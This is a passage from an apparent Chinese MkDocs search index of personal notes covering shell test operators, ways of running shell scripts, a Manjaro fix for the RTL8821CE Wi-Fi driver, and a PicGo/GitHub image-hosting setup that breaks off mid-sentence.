\u68c0\u6d4b\u5b57\u7b26\u4e32\u662f\u5426\u4e3a\u7a7a\uff0c\u4e0d\u4e3a\u7a7a\u8fd4\u56de true\u3002 -n \u68c0\u6d4b\u5b57\u7b26\u4e32\u957f\u5ea6\u662f\u5426\u4e0d\u4e3a 0\uff0c\u4e0d\u4e3a 0 \u8fd4\u56de true\u3002 -z \u68c0\u6d4b\u5b57\u7b26\u4e32\u957f\u5ea6\u662f\u5426\u4e3a 0\uff0c\u4e3a 0 \u8fd4\u56de true\u3002 <p><code>$</code> \u3001 <code>-n</code> \u3001 <code>-z</code> \u662f\u4e09\u4e2a <code>\u5355\u76ee\u8fd0\u7b97\u7b26</code> \uff1a</p> <pre><code>if [ -z $a ]\nthen\n   echo \"-z $a : \u5b57\u7b26\u4e32\u957f\u5ea6\u4e3a 0\"\nelse\n   echo \"-z $a : \u5b57\u7b26\u4e32\u957f\u5ea6\u4e0d\u4e3a 0\"\nfi\n\nif [ -n \"$a\" ]\nthen\n   echo \"-n $a : \u5b57\u7b26\u4e32\u957f\u5ea6\u4e0d\u4e3a 0\"\nelse\n   echo \"-n $a : \u5b57\u7b26\u4e32\u957f\u5ea6\u4e3a 0\"\nfi\n\nif [ $a ]\nthen\n   echo \"$a : \u5b57\u7b26\u4e32\u4e0d\u4e3a\u7a7a\"\nelse\n   echo \"$a : \u5b57\u7b26\u4e32\u4e3a\u7a7a\"\nfi\n</code></pre>"},{"location":"language/shell/operator/#_5","title":"\u6587\u4ef6\u6d4b\u8bd5\u8fd0\u7b97\u7b26","text":"<p>\u6587\u4ef6\u6d4b\u8bd5\u8fd0\u7b97\u7b26\u7528\u4e8e\u68c0\u6d4b Unix \u6587\u4ef6\u7684\u5404\u79cd\u5c5e\u6027\uff1a</p> <p>\u5c5e\u6027\u68c0\u6d4b\u63cf\u8ff0\u5982\u4e0b\uff1a</p> \u64cd\u4f5c\u7b26 \u8bf4\u660e -b file \u68c0\u6d4b\u6587\u4ef6\u662f\u5426\u662f\u5757\u8bbe\u5907\u6587\u4ef6\uff0c\u5982\u679c\u662f\uff0c\u5219\u8fd4\u56de true\u3002 -c file \u68c0\u6d4b\u6587\u4ef6\u662f\u5426\u662f\u5b57\u7b26\u8bbe\u5907\u6587\u4ef6\uff0c\u5982\u679c\u662f\uff0c\u5219\u8fd4\u56de true\u3002 -e file \u68c0\u6d4b\u6587\u4ef6\uff08\u5305\u62ec\u76ee\u5f55\uff09\u662f\u5426\u5b58\u5728\uff0c\u5982\u679c\u662f\uff0c\u5219\u8fd4\u56de true\u3002 -s file \u68c0\u6d4b\u6587\u4ef6\u662f\u5426\u4e3a\u7a7a\uff08\u6587\u4ef6\u5927\u5c0f\u662f\u5426\u5927\u4e8e 0\uff09\uff0c\u4e0d\u4e3a\u7a7a\u8fd4\u56de true\u3002 -x file \u68c0\u6d4b\u6587\u4ef6\u662f\u5426\u53ef\u6267\u884c\uff0c\u5982\u679c\u662f\uff0c\u5219\u8fd4\u56de true\u3002 -w file \u68c0\u6d4b\u6587\u4ef6\u662f\u5426\u53ef\u5199\uff0c\u5982\u679c\u662f\uff0c\u5219\u8fd4\u56de true\u3002 -r file \u68c0\u6d4b\u6587\u4ef6\u662f\u5426\u53ef\u8bfb\uff0c\u5982\u679c\u662f\uff0c\u5219\u8fd4\u56de true\u3002 -u file \u68c0\u6d4b\u6587\u4ef6\u662f\u5426\u8bbe\u7f6e\u4e86 SUID \u4f4d\uff0c\u5982\u679c\u662f\uff0c\u5219\u8fd4\u56de true\u3002 -p file \u68c0\u6d4b\u6587\u4ef6\u662f\u5426\u662f\u6709\u540d\u7ba1\u9053\uff0c\u5982\u679c\u662f\uff0c\u5219\u8fd4\u56de true\u3002 -k file \u68c0\u6d4b\u6587\u4ef6\u662f\u5426\u8bbe\u7f6e\u4e86\u7c98\u7740\u4f4d(Sticky Bit)\uff0c\u5982\u679c\u662f\uff0c\u5219\u8fd4\u56de true\u3002 -g file \u68c0\u6d4b\u6587\u4ef6\u662f\u5426\u8bbe\u7f6e\u4e86 SGID \u4f4d\uff0c\u5982\u679c\u662f\uff0c\u5219\u8fd4\u56de true\u3002 -f file \u68c0\u6d4b\u6587\u4ef6\u662f\u5426\u662f\u666e\u901a\u6587\u4ef6\uff08\u65e2\u4e0d\u662f\u76ee\u5f55\uff0c\u4e5f\u4e0d\u662f\u8bbe\u5907\u6587\u4ef6\uff09\uff0c\u5982\u679c\u662f\uff0c\u5219\u8fd4\u56de true\u3002 -d file \u68c0\u6d4b\u6587\u4ef6\u662f\u5426\u662f\u76ee\u5f55\uff0c\u5982\u679c\u662f\uff0c\u5219\u8fd4\u56de true\u3002 <p>\u5176\u4ed6\u68c0\u67e5\u7b26\uff1a</p> <ul> <li>-S\uff1a\u5224\u65ad\u67d0\u6587\u4ef6\u662f\u5426 socket</li> <li>-L\uff1a\u68c0\u6d4b\u6587\u4ef6\u662f\u5426\u5b58\u5728\u5e76\u4e14\u662f\u4e00\u4e2a\u7b26\u53f7\u8fde\u63a5</li> </ul>"},{"location":"language/shell/run-script/","title":"\u6267\u884c\u811a\u672c: zsh bash source ./","text":""},{"location":"language/shell/run-script/#_1","title":"\u524d\u63d0\u6982\u5ff5","text":"<ul> <li> <p>\u4ea4\u4e92\u6a21\u5f0f\uff1a\u624b\u52a8\u8f93\u5165\u4e00\u4e9b\u5217 Linux \u547d\u4ee4\uff0c\u6bd4\u5982 <code>ls</code> \u3001 <code>cd</code> \u7b49</p> </li> <li> <p>\u975e\u4ea4\u4e92\u6a21\u5f0f\uff1a\u53ef\u4ee5\u7406\u89e3\u4e3a\u6267\u884c shell \u811a\u672c\uff0cshell \u4ece\u6587\u4ef6\u6216\u7ba1\u9053\u4e2d\u8bfb\u53d6\u547d\u4ee4\u5e76\u6267\u884c\uff0c\u5f53 shell \u89e3\u91ca\u5668\u6267\u884c\u5b8c\u6587\u4ef6\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u547d\u4ee4\uff0cshell \u8fdb\u7a0b\u7ec8\u6b62\uff0c\u5e76\u56de\u5230\u7236\u8fdb\u7a0b\u3002</p> </li> <li> <p>\u5728\u65b0\u8fdb\u7a0b\u4e2d\u8fd0\u884c shell \u811a\u672c</p> <ul> <li> <p>\u5c06\u811a\u672c\u7a0b\u5e8f\u4f5c\u4e3a \u53ef\u6267\u884c\u7a0b\u5e8f \u8fd0\u884c\uff1a<code>./shell_script.sh</code> \uff0c\u8fd9\u79cd\u65b9\u6cd5\u9700\u8981\u5148\u7ed9\u811a\u672c\u6dfb\u52a0\u6267\u884c\u6743\u9650\uff1a <code>chmod +x shell_script.sh</code></p> </li> <li> <p>\u5c06 shell \u811a\u672c\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9 shell \u89e3\u91ca\u5668\uff1a<code>bash shell_script.sh</code> \uff0c\u8fd9\u79cd\u65b9\u6cd5\u4e0d\u9700\u8981\u7ed9\u811a\u672c\u6267\u884c\u6743\u9650\uff0c\u4e5f\u4e0d\u9700\u8981\u5728\u811a\u672c\u6587\u4ef6\u7684\u7b2c\u4e00\u884c\u6307\u5b9a\u811a\u672c\u89e3\u91ca\u5668\uff0c\u6307\u5b9a\u4e86\u4e5f\u4f1a\u88ab\u5ffd\u7565\u3002</p> </li> </ul> </li> <li> <p>\u5728\u5f53\u524d\u8fdb\u7a0b\u4e2d\u8fd0\u884c shell \u811a\u672c\uff1a<code>source shell_script.sh</code> \uff0c\u8fd9\u79cd\u65b9\u6cd5\u4f1a\u5f3a\u5236\u6267\u884c\u811a\u672c\u6587\u4ef6\u4e2d\u7684\u5168\u90e8\u547d\u4ee4\uff0c\u4e0d\u9700\u8981\u7ed9\u811a\u672c\u6267\u884c\u6587\u4ef6\u3002\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\uff0c\u5f53\u6211\u4eec <code>source ~/.zshrc</code>\u7684\u65f6\u5019\uff0c\u914d\u7f6e\u4f1a\u7acb\u5373\u751f\u6548\uff0c\u662f\u56e0\u4e3a\u5c31\u662f\u5728\u5f53\u524d\u8fdb\u7a0b\u8fd0\u884c\u7684\uff01</p> <p>Note</p> <p>\u901a\u8fc7 source \u6267\u884c\u65f6\uff0c\u811a\u672c\u6587\u4ef6\u6307\u5b9a\u811a\u672c\u89e3\u91ca\u5668\u7684\u547d\u4ee4\u662f\u65e0\u6548\u7684\uff0c\u9ed8\u8ba4\u4f7f\u7528\u5f53\u524d shell</p> </li> </ul>"},{"location":"language/shell/run-script/#_2","title":"\u5b9e\u9a8c\u5206\u6790","text":"<p>\u5982\u56fe\uff0c\u6784\u5efa\u4e86\u4e00\u4e2a\u6570\u7ec4\uff1a <code>nums=[red yellow green]</code></p> <ul> <li><code>zsh test.sh</code>\uff1a <code>#!/bin/bash</code> \u88ab\u5ffd\u7565\uff0c\u56e0\u6b64\u5f53\u524d shell \u4e3a zsh\uff0czsh \u7684\u6570\u7ec4\u4ece 1 \u5f00\u59cb\u8ba1\u6570\uff0c\u56e0\u6b64\u53d6\u51fa\u7684\u5185\u5bb9\u4e3a red\u3002</li> <li><code>bash test.sh</code>\uff1a <code>#!/bin/bash</code> \u88ab\u5ffd\u7565\uff0c\u56e0\u6b64\u5f53\u524d shell \u4e3a bash\uff0cbash \u7684\u6570\u7ec4\u4ece 0 \u5f00\u59cb\u8ba1\u6570\uff0c\u56e0\u6b64\u53d6\u51fa\u7684\u5185\u5bb9\u4e3a yellow\u3002</li> <li><code>./test.sh</code> \uff1a\u65b0\u5f00\u8fdb\u7a0b\u8fdb\u884c\u8fd0\u884c\uff0c<code>#!/bin/bash</code> \u88ab\u8fd0\u884c\uff0c\u56e0\u6b64\u5f53\u524d shell \u4e3a bash\uff0cbash \u7684\u6570\u7ec4\u4ece 0 \u5f00\u59cb\u8ba1\u6570\uff0c\u56e0\u6b64\u53d6\u51fa\u7684\u5185\u5bb9\u6539\u4e3a yellow\u3002</li> <li><code>source test.sh</code> \uff1a\u5728\u5f53\u524d\u8fdb\u7a0b\u8fd0\u884c\uff0c\u5f53\u524d\u8fdb\u7a0b\u7684 shell \u4e3a zsh\uff08\u56fe\u4e2d\u7b2c\u4e00\u6b21 source\uff09\uff0c <code>#!/bin/bash</code> \u88ab\u5ffd\u7565\uff0c\u5f53\u524d shell \u4e3a zsh\uff0c\u56e0\u6b64\u53d6\u51fa\u7684\u5185\u5bb9\u4e3a red\u3002</li> </ul> <p>\u7b2c\u4e8c\u6b21\u8fd0\u884c source \u65f6\uff0c\u5f53\u524d shell \u4e3a bash\uff0c\u56e0\u6b64\u53d6\u51fa\u7684\u5185\u5bb9\u4e3a yellow\u3002</p>"},{"location":"other/","title":"Other","text":"<p>Abstract</p> <p>\u672c\u7ae0\u8282\u8bb0\u5f55\u4e0d\u4fbf\u4e8e\u5f52\u7c7b\u7684\u6742\u9879\u7b14\u8bb0\u3002</p>"},{"location":"other/Manjaro%20%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E4%BF%AE%E5%A4%8D/","title":"Manjaro \u7cfb\u7edf Rtl8821ce \u65e0\u7ebf\u7f51\u5361\u8fde\u63a5 Wifi","text":""},{"location":"other/Manjaro%20%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E4%BF%AE%E5%A4%8D/#_1","title":"\u96f6\u3001\u80cc\u666f","text":"<p>\u5728\u7b14\u8bb0\u672c\u5b89\u88c5 Manjaro \u7cfb\u7edf\u5b89\u88c5\u540e\u641c\u7d22\u4e0d\u5230 WIFI\uff0c\u6392\u67e5\u53ef\u77e5\uff0c\u95ee\u9898\u662f\u7531\u4e8e\u5185\u6838\u4e0d\u652f\u6301 rtl8821ce \u65e0\u7ebf\u7f51\u5361\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u5b89\u88c5\u4e00\u4e2a**\u7b2c\u4e09\u65b9\u7684\u65e0\u7ebf\u7f51\u5361\u9a71\u52a8**\u6765\u5b9e\u73b0\u5728 Manjaro \u7cfb\u7edf\u4e0a\u4f7f\u7528 WIFI\u3002</p>"},{"location":"other/Manjaro%20%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E4%BF%AE%E5%A4%8D/#_2","title":"\u4e00\u3001\u524d\u7f6e\u51c6\u5907","text":"<p>First of all\uff0cF2 \u8fdb\u5165 bios\uff0c\u8fdb\u5165 secure boot\uff0c\u5173\u95ed\u5b89\u5168\u542f\u52a8\u548c\u5feb\u901f\u542f\u52a8\u3002</p> <p>Then\uff0c\u9700\u8981\u4e00\u4e2a\u6709\u7ebf\u7f51\uff0c\u53ef\u4ee5\u7528 usb \u624b\u673a\u8fde\u63a5\u7535\u8111\uff0c\u7136\u540e\u5728\u4e2a\u4eba\u70ed\u70b9\u4e2d\u5f00\u542f USB \u7f51\u7edc\u5171\u4eab\uff0c\u5982\u679c\u65e0\u6cd5\u8fde\u63a5\uff0c\u8bf7\u68c0\u67e5\u6709\u7ebf\u7f51\u5361\u53ca\u5176\u9a71\u52a8\u662f\u5426\u6b63\u786e\u5b89\u88c5\u4ee5\u53ca\u578b\u53f7\u662f\u5426\u5bf9\u5e94\uff0c\u4e0d\u7ec6\u8bf4\u4e86\u3002</p> <p>\u63a5\u4e0b\u6765\u89e3\u51b3 wifi \u95ee\u9898\uff0c\u56e0\u4e3a\u8fd9\u4e2a\uff0c\u6211\u91cd\u88c5\u4e86\u5341\u51e0\u6b21\u7cfb\u7edf\uff0c\u751a\u81f3\u534a\u591c\u4e09\u70b9\u7761\u4e0d\u7740\uff0c\u56db\u70b9\u6c14\u4e0d\u8fc7\u53c8\u8d77\u6765\u67e5\u653b\u7565\uff0c\u7ed3\u679c\u4e5f\u6ca1\u5f04\u51fa\u6765\uff0c\u4e5d\u70b9\u591a\u53bb\u4e0a\u73ed\uff0c\u611f\u89c9\u5fc3\u810f\u8df3\u4e0d\u52a8\u4e86\u53ea\u6709\u5b57\u8282\u5728\u8df3\u52a8\uff01</p> <p>\u7279\u6b64\u8bb0\u5f55\uff1a2021.03.27 \u51cc\u6668 4 \u70b9\u7684 peking~</p>"},{"location":"other/Manjaro%20%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E4%BF%AE%E5%A4%8D/#1-uname-a","title":"\u2460 \u67e5\u770b\u7cfb\u7edf\u5185\u6838\uff1a<code>uname -a</code>","text":"<pre><code>[leqing@leqing-book ~]$ uname -a\nLinux leqing-book 5.4.105-1-MANJARO #1 SMP PREEMPT Thu Mar 11 18:27:58 UTC 2021 x86_64 GNU/Linux\n# \u53ef\u4ee5\u770b\u5230\u7cfb\u7edf\u5185\u6838\u5df2\u7ecf\u662f5.4\u7248\u672c\uff0c\u539f\u672c\u662f5.9\uff0c\u4f46\u662f5.9\u7248\u672c\u5bf9RTL8821CE\u652f\u6301\u5f88\u5dee\uff0c\u56e0\u6b64\u9700\u8981\u4fee\u6539\u4e3a5.4\n</code></pre>"},{"location":"other/Manjaro%20%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E4%BF%AE%E5%A4%8D/#2","title":"\u2461 \u67e5\u770b\u7f51\u5361\u4fe1\u606f","text":"<p><code>lspci -k</code></p> <pre><code>[leqing@leqing-book ~]$ lspci -k\n03:00.0 Network controller: Realtek Semiconductor Co., Ltd. RTL8821CE 802.11ac PCIe Wireless Network Adapter\n       Subsystem: AzureWave Device 3041\n       Kernel driver in use: rtl8821ce\n       Kernel modules: 8821ce\n04:00.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL8111/8168/8411 PCI Express Gigabit Ethernet Controller (rev 15)\n       Subsystem: ASUSTeK Computer Inc. Device 208f\n       Kernel driver in use: r8169\n       Kernel modules: r8169\n# \u7b2c\u4e00\u6761\u6570\u636ewireless Network\uff0c\u4e5f\u5373\u662f\u65e0\u7ebf\u7f51\u5361\u578b\u53f7\u662fRTL8821CE\uff0cdriver\u4e5f\u662frtl8821ce\uff0c\u672c\u6559\u7a0b\u5c31\u662f\u4e3a\u4e86\u6302\u8f7d\u4e0a\u8fd9\u4e2a\u9a71\u52a8\uff01\n# \u7b2c\u4e8c\u6761\u6570\u636e\u662f\u6709\u7ebf\u7f51\u5361\uff0c\u53ef\u4ee5\u770b\u5230\u9a71\u52a8\u548c\u7f51\u5361\u578b\u53f7\u4e0d\u5bf9\u5e94\uff0c\u4f46\u662f\u80fd\u7528\uff0c\u4e0d\u77e5\u9053\u4e3a\u5565\u3002\n</code></pre> <p>or <code>inxi -Fxxxza --no-host</code></p> <pre><code>[leqing@leqing-book ~]$ inxi -Fxxxza --no-host\n\nNetwork:  Device-1: Realtek RTL8821CE 802.11ac PCIe Wireless Network Adapter vendor: AzureWave driver: rtl8821ce v: N/A\n          modules: 8821ce port: 4000 bus-ID: 03:00.0 chip-ID: 10ec:c821 class-ID: 0280\n          IF: wlp3s0 state: up mac: &lt;filter&gt;\n          Device-2: Realtek RTL8111/8168/8411 PCI Express Gigabit Ethernet vendor: ASUSTeK driver: r8169 v: kernel port: 3000\n          bus-ID: 04:00.0 chip-ID: 10ec:8168 class-ID: 0200\n          IF: enp4s0 state: down mac: &lt;filter&gt;\n          IF-ID-1: enp0s20f0u3 state: unknown speed: N/A duplex: N/A mac: &lt;filter&gt;\n# \u84dd\u7259\nBluetooth: Device-1: IMC Networks Bluetooth Radio type: USB driver: btusb v: 0.8 bus-ID: 1-14:5 chip-ID: 13d3:3530\n          class-ID: e001 serial: &lt;filter&gt;\n          Report: This feature requires one of these tools: hciconfig/bt-adapter\n          Device-2: Xiaomi Mi/Redmi series (RNDIS) type: USB driver: rndis_host v: kernel bus-ID: 1-3:6 chip-ID: 2717:ff80\n          class-ID: 0a00 serial: &lt;filter&gt;\n</code></pre>"},{"location":"other/Manjaro%20%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E4%BF%AE%E5%A4%8D/#3","title":"\u2462 \u4e0b\u8f7d\u6e90\u8bbe\u7f6e","text":"<pre><code># \u6362\u56fd\u5185\u955c\u50cf\u6e90\uff1a\nsudo pacman-mirrors -i -c China -m rank\n# \u8bbe\u7f6earchlinuxcn\u6e90\uff0c\u8fd9\u4e2a\u662f\u5fc5\u987b\u7684\uff0c\u5426\u5219rtl8821ce-dkms-git\u65e0\u6cd5\u5b8c\u5168\u4e0b\u8f7d\nsudo nano /etc/pacman.conf\n# \u5728\u6587\u4ef6\u672b\u5c3e\u6dfb\u52a0\u4ee5\u4e0b\u5185\u5bb9\n[archlinuxcn]\nSigLevel = Optional TrustedOnly\nServer = https://mirrors.ustc.edu.cn/archlinuxcn/$arch\n\n# ctrl x\u9000\u51fa\uff0cy\u786e\u5b9a\u4fdd\u5b58\n\n# \u66f4\u65b0\u6e90\u5217\u8868\nsudo pacman-mirrors -g\n</code></pre> <p>\u66f4\u65b0\u7cfb\u7edf\uff1a<code>sudo pacman -Syyu</code></p>"},{"location":"other/Manjaro%20%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E4%BF%AE%E5%A4%8D/#_3","title":"\u4e8c\u3001\u5185\u6838\u4e0b\u8f7d","text":"<p>\u5185\u6838\u4e0b\u8f7d\uff1a\u547d\u4ee4\u884c\u65b9\u6cd5\u89c1\u53c2\u8003\u94fe\u63a5</p> <p>\u4e5f\u53ef\u4ee5\u5728<code>\u8bbe\u7f6e-\u5185\u6838</code>\u4e2d\u9009\u62e9\u6240\u9700\u7248\u672c</p> <p>\u91cd\u542f\u8fdb\u5165 grub\uff0c\u9009\u62e9\u5185\u6838 5.4\uff0c\u56e0\u4e3a 5.9 \u4f1a\u6709\u95ee\u9898\uff08\u53ef\u80fd\u52a0\u5165 blacklist \u540e\u53ef\u4ee5\u89e3\u51b3\uff0c\u6ca1\u5c1d\u8bd5\uff09\uff01</p>"},{"location":"other/Manjaro%20%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E4%BF%AE%E5%A4%8D/#grub","title":"\u4e09\u3001grub \u8bbe\u7f6e","text":"<p>change kernel need grub\uff1a</p> <pre><code>sudo pacman -S grub # \u5b89\u88c5grub\nsudo nano /etc/default/grub\n\n# \u4e3a\u4e86\u8ba9\u5f00\u673a\u7684\u65f6\u5019\u8fdb\u5165grub\u754c\u9762\uff0c\u4fee\u6539 GRUB_TIMEOUT_STYLE=hidden\u4e3a\u5982\u4e0b\u5185\u5bb9\uff1a\nGRUB_TIMEOUT_STYLE=menu\n\n# \u5728 GRUB_CMDLINE_LINUX_DEFAULT\u7684\u672b\u5c3e\u52a0\u4e0apci=noaer\nGRUB_CMDLINE_LINUX_DEFAULT=\"quiet splash pci=noaer\"\n# \u6ce8\u610f\uff0cpci=noaer\u524d\u9762\u7684\u5185\u5bb9\u662f\u56e0\u4eba\u800c\u5f02\u7684\uff0c\u4e0d\u8981\u52a8\u5b83\uff01\u6dfb\u52a0\u5728\u672b\u5c3e\u5373\u53ef\uff01\n# \u539f\u56e0\uff1aYour distribution may come with PCIe Active State Power Management enabled by default. That may conflict with this driver\n\n# \u4fdd\u5b58\u914d\u7f6e\nsudo update-grub\n\n# \u91cd\u542f\nreboot\n</code></pre>"},{"location":"other/Manjaro%20%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E4%BF%AE%E5%A4%8D/#_4","title":"\u56db\u3001\u65e0\u7ebf\u7f51\u5361\u9a71\u52a8\u4e0b\u8f7d","text":"<p>\u4e0b\u8f7d\u5339\u914d linux \u5185\u6838\u7248\u672c\u7684 headers\uff1a</p> <p><code>sudo pacman -S dkms linuxXX-headers</code></p> <p>\u6b64\u5904\u7684 XX \u7528\u81ea\u5df1\u7684\u5185\u6838\u7248\u672c\u66f4\u6362\uff0c\u5982\u5185\u6838\u7248\u672c 5.4\uff0c\u5219 linux54-headers</p> <p><code>sudo pacman -S pamac-cli</code> \u4e0d\u77e5\u9053\u6709\u6ca1\u6709\u7528\uff0c\u4f46\u8fd8\u662f\u5b89\u88c5\u4e00\u4e0b\uff01</p> <p><code>pamac build rtl8821ce-dkms-git</code></p> <p>\u5173\u673a\uff0c\u5b8c\u5168\u5207\u65ad\u7535\u6e90\uff01\u518d\u5f00\u673a\uff01\u4e00\u5b9a\u8981\u5b8c\u5168\u5173\u673a\uff01</p> <p>\u5f00\u673a\uff1a\u6302\u8f7d\u9a71\u52a8\uff0c\u975e\u5e38\u975e\u5e38\u975e\u5e38\u91cd\u8981\uff01</p> <p><code>sudo modprobe 8821ce</code></p> <p><code>lsmod</code>\u67e5\u770b\u662f\u5426\u52a0\u8f7d\u5185\u6838\u6a21\u5757<code>lsmod | grep 8821ce</code></p> <p>\u6709\u65f6\u5fc5\u987b\u91cd\u65b0\u7f16\u8bd1 dkms \u8f6f\u4ef6\u5305\uff08\u4e07\u4e00\u53d1\u751f\u9519\u8bef\uff08pacman \u66f4\u65b0\uff09\uff0c\u901a\u5e38\u662f\u5185\u6838\u66f4\u65b0\uff09\uff0c \u5982\u679c\u51fa\u73b0\u4efb\u4f55\u9519\u8bef\uff0c\u53ea\u9700\u518d\u6b21\u8fd0\u884c dkms \u8f6f\u4ef6\u5305</p> <p><code>pamac update -a</code>\uff08\u6240\u6709 AUR \u66f4\u65b0\uff09 \u6216 <code>pamac build rtl8821ce-dkms-git</code>\uff08\u65b0\u7684 rtl8821AUR \u5185\u90e8\u7248\u672c\uff09</p>"},{"location":"other/Manjaro%20%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E4%BF%AE%E5%A4%8D/#_5","title":"\u4e94\u3001\u4e0d\u786e\u5b9a\u6709\u6ca1\u6709\u7528\u7684\u8bbe\u7f6e","text":""},{"location":"other/Manjaro%20%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E4%BF%AE%E5%A4%8D/#1-wifi-blocked","title":"\u2460 \u786e\u5b9a wifi \u672a\u88ab blocked","text":"<p>\u67e5\u770b\u4f60\u7684 wifi \u662f\u5426\u88ab\u963b\u6b62\uff1a<code>rfkill list all</code></p> <pre><code>[leqing@leqing-book ~]$ rfkill list all\n0: hci0: Bluetooth\n       Soft blocked: no\n       Hard blocked: no\n1: phy0: Wireless LAN\n       Soft blocked: no\n       Hard blocked: no\n</code></pre> <p>\u82e5\u5b58\u5728 yes\uff0c\u89e3\u9501\uff1a<code>sudo rfkill unblock all</code></p>"},{"location":"other/Manjaro%20%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E4%BF%AE%E5%A4%8D/#2-networkmanager","title":"\u2461 \u91cd\u542f NetworkManager","text":"<p>\u91cd\u542f\u4e00\u4e0b\uff0c\u4e07\u4e00\u884c\u4e86\u5462\uff1f</p> <pre><code>sudo systemctl stop NetworkManager\nsudo systemctl start NetworkManager\n# or\nsudo systemctl restart NetworkManager\n</code></pre>"},{"location":"other/Manjaro%20%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E4%BF%AE%E5%A4%8D/#3windows","title":"\u2462Windows \u5927\u6cd5","text":"<p>\u6709\u6ca1\u6709\u60f3\u8fc7\u91cd\u65b0\u5b89\u88c5 windows \u5462\uff1f</p> <p>\u4f60\u8bf4\u6298\u817e\u8fd9\u73a9\u610f\u5e72\u5565\uff01\u6de6\uff01</p>"},{"location":"other/Manjaro%20%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E4%BF%AE%E5%A4%8D/#_6","title":"\u516d\u3001\u53c2\u8003\u94fe\u63a5","text":"<ul> <li>grub<ul> <li>How to Update GRUB on Arch Linux</li> <li>GRUB Menu Not Showing On Boot, Boots into Default Kernel Instead</li> </ul> </li> <li>\u65e0\u7ebf\u9a71\u52a8\u5b89\u88c5<ul> <li>Laptop with RTL8821CE not connecting to wifi</li> <li>Realtek WiFi Driver Installation (AUR)</li> <li>rtl8821ce github \u4ec5\u4ec5\u53c2\u8003\u95ee\u9898\u89e3\u51b3</li> </ul> </li> <li>\u5185\u6838\u5b89\u88c5<ul> <li>Manjaro Kernels - Manjaro</li> </ul> </li> <li>\u4e0b\u8f7d\u6e90\u8bbe\u7f6e<ul> <li>Manjaro Linux \u66f4\u65b0\u56fd\u5185\u955c\u50cf\u6e90 - \u7b80\u4e66</li> </ul> </li> </ul>"},{"location":"other/picgo-typora-oss/","title":"\u56fe\u5e8a\uff1aPicgo + Typora + OSS","text":""},{"location":"other/picgo-typora-oss/#github-picgo","title":"\u4e00\u3001Github + Picgo","text":""},{"location":"other/picgo-typora-oss/#11-github","title":"1.1 Github","text":"<p>\u9996\u5148\u6784\u5efa\u4e00\u4e2a\u4ed3\u5e93 FigureBed-one\uff0c\u968f\u540e\u83b7\u53d6tokens</p> <p></p> <p> \u53ea\u9700\u8981\u52fe\u9009 repo \u5373\u53ef\uff01</p>"},{"location":"other/picgo-typora-oss/#12-picgo","title":"1.2 Picgo","text":"<p>\u5047\u8bbegithub \u56fe\u7247\u94fe\u63a5\u4e3a\uff1a<code>https://github.com/WlqFigureBed/FigureBed-one/raw/master/img/20210710143025.png</code></p> <p>\u8bbe\u7f6e\u81ea\u5b9a\u4e49\u57df\u540d\uff1a <code>https://github.com/WlqFigureBed/FigureBed-one/raw/master</code></p> <ul> <li>WlqFigureBed \u4e3a\u7528\u6237\u540d</li> <li>FigureBed-one \u4e3a\u4ed3\u5e93\u540d</li> <li>raw\uff1a\u7528\u4e8e\u4ee3\u66ff blob\uff0c\u5426\u5219\u65e0\u6cd5\u6b63\u5e38\u663e\u793a\uff01</li> <li>master \u5206\u652f\u540d\uff0c\u6b64\u5904\u5199\u4e3b\u5206\u652f\u5373\u53ef</li> <li>20200710132336 \u662f\u65f6\u95f4\u6233\u547d\u540d\u7684\u56fe\u7247\u540d</li> </ul> <p>\u8bbe\u5b9a Token\uff1a\u4f60\u53ef\u4ee5\u4ece \u8fd9\u91cc \u83b7\u53d6 Github Token</p> <p>\u6700\u597d\u5f00\u542f\u65f6\u95f4\u6233\u91cd\u547d\u540d\uff1a</p> <p></p>"},{"location":"other/picgo-typora-oss/#13","title":"1.3 \u4e0a\u4f20\u5931\u8d25\u600e\u4e48\u529e\uff1f","text":""},{"location":"other/picgo-typora-oss/#131-server","title":"1.3.1 \u68c0\u67e5 server \u7684\u7aef\u53e3\u662f\u5426\u6b63\u786e","text":"<p>\u5982\u679c\u4e0d\u884c\uff0c\u53ef\u4ee5\u5148\u5173\u95ed Server\uff0c\u4fdd\u5b58\u540e\u518d\u6253\u5f00 Server \u8bd5\u8bd5\u770b\u3002</p>"},{"location":"other/picgo-typora-oss/#132","title":"1.3.2 \u8bbe\u7f6e\u4ee3\u7406","text":"<p>\u5982\u679c\u662f\u7531\u4e8e\u88ab\u5899\u5bfc\u81f4\u7684\u8bf7\u6c42\u8d85\u65f6\uff0c\u53ef\u901a\u8fc7\u8bbe\u7f6e\u4ee3\u7406\u89e3\u51b3\uff1a</p> <p></p> <p>\u4ee3\u7406\u7684\u7aef\u53e3\u53ef\u4ee5\u4ece\u79d1\u5b66\u4e0a\u7f51\u7684\u5de5\u5177\u83b7\u5f97\uff0c\u8bbe\u7f6e\u5373\u53ef\uff1a</p> <p></p>"},{"location":"other/picgo-typora-oss/#oss-picgo","title":"\u4e8c\u3001\u963f\u91cc\u4e91 OSS + picgo\uff08\u63a8\u8350\uff09","text":"<p>Github + picgo \u7684\u65b9\u6cd5\u53ef\u884c\uff0c\u4f46\u662f\u56fd\u5185\u65e0\u6cd5\u8bbf\u95ee Github\uff0c\u4e14 Gitee \u5f15\u5165\u5f00\u6e90\u5ba1\u6838\u540e\uff0c\u65e0\u6cd5\u516c\u5f00\u56fe\u5e8a\u4ed3\u5e93\uff0c\u56e0\u6b64\u65e0\u6cd5\u4f5c\u4e3a Github 